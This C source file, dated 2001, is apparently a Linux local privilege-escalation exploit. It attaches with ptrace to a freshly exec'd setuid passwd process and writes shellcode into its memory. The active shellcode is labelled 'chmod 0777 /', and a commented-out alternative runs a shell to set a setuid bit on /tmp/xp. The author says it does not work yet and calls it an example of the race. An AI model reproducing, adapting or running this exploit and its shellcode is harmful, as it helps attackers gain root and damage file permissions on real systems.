/* 
 *  ptracing the suid for fun and proffit
 *
 *  21/03/2001 - tmoggie
 *
 *  exploit DOESN'T WORK yet.. so don't blame me for it :P
 *  it's an example of the race!
 *
 *  gcc -Wall -o ptrace_expl ptrace_expl.c
 *
 */

#include <sys/ptrace.h>
#include <sys/procfs.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <signal.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <asm/ptrace.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// chmod 0777 /
char *shellcode = "\xb8\x0f\x00\x00\x00\x68\x2f\x00\x00\x2f\x89\xe3\xb9\xff\x01\x00\x00\xcd\x80";

/* "\x31\xc0\x83\xc0\x17\x31\xdb\xcd\x80\xeb"
"\x30\x5f\x31\xc9\x88\x4f\x17\x88\x4f\x1a"
"\x8d\x5f\x10\x89\x1f\x8d\x47\x18\x89\x47"
"\x04\x8d\x47\x1b\x89\x47\x08\x31\xc0\x89"
"\x47\x0c\x8d\x0f\x8d\x57\x0c\x83\xc0\x0b"
"\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8"
"\xcb\xff\xff\xff\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x2f\x62\x69\x6e\x2f\x73\x68\x30\x2d\x63"
"\x30"
"chmod 4777 /tmp/xp"; */

long int some_add = 0x08048bc8 ;

void
stat(int pid) {
	int i;
	char fname[1024];

	sprintf(fname,"/proc/%d/status",pid);
        i = open(fname,O_RDONLY);
        printf("open : %d\n",i);
        read(i,fname,sizeof(fname));
        close(i);
        i=0;
        while (fname[i] != '\n') i++;
        i++;
        while (fname[i]!='\n') i++;
        fname[i]='\0';
        printf("==================== status ============\n%s\n",fname);
	printf("****************************************\n");
}

int main(int argc, char **argv)
{
	int pid;
	int i,j;
	int cnt;
	void * p;
	struct pt_regs regs;
	/*struct elf_prpsinfo proc;*/

	if (argc == 1) {
		printf("[+] cleaning disk cache, pleas be patient...");
		fflush(stdout);
		system("cat /usr/bin/* >/dev/null 2>&1");
		printf(" [done]\n[+] starting main code\n");
		execl(argv[0],argv[0],"daj-mi-qrfa-roota",0);
	}

	pid = fork();
	if (pid == 0) {
 			i = open("/etc/lilo.conf",O_RDONLY);
			p = mmap(0,102400,PROT_READ,MAP_PRIVATE,i,0);
			printf("Child exec\n");
			execl("/usr/bin/passwd", p, 0);
			printf("C aiaiai: %s\n",strerror(errno));
			exit(-1);
	} 
        stat(pid); 
	i = ptrace(PTRACE_ATTACH, pid, 0, 0);
	printf("P ATT: %d : %s\n",i,strerror(errno));
	if (i != 0)  {
		printf("P ATT: failed: %s\n",strerror(errno));
		exit(-1);
	}
	i = waitpid(pid,0,0);
	i = ptrace(PTRACE_GETREGS,pid,&regs,0);
	printf("PTRACE_GETREGS returned: %d : %s\n",i,strerror(errno));
	stat(pid);
/*	printf("eip = 0x%8.8lx\n",regs.eip);

	printf("new eip = 0x0%8.8lx\n",some_add);
	regs.eip = some_add;
	i = ptrace(PTRACE_SETREGS,pid,&regs,5);
	printf("[+] PTRACE_SETREGS returned: %d : %s\n",i,strerror(errno));
*/
	if ( (i = ptrace(PTRACE_POKEUSER, pid, 4*EIP, shellcode)) != 0)
		fprintf(stderr, "err. ERROR ptrace_pikeuser\n");

	stat(pid);
	printf("[+] copy shellcode from P:0x%8.8x to C:0x%8.8lx\n[",
			(int)shellcode,some_add);
	for (j=0;j<strlen(shellcode);j+=4) {
		i = ptrace(PTRACE_POKETEXT,pid,some_add+j,*(int*)(shellcode+j));
		printf(".");
		if (i != 0) {
			printf("\n[-] PTRACE_POKETEXT returned: %d : %s\n",i,strerror(errno));
			printf("exiting\n");
			exit(-1);
		}
	}
	printf("]\n");
	stat(pid);
        i = ptrace(PTRACE_DETACH, pid, 0, 0);
	stat(pid);
	exit(0);	/* gnu coding standarts :> */
	return(0);
}
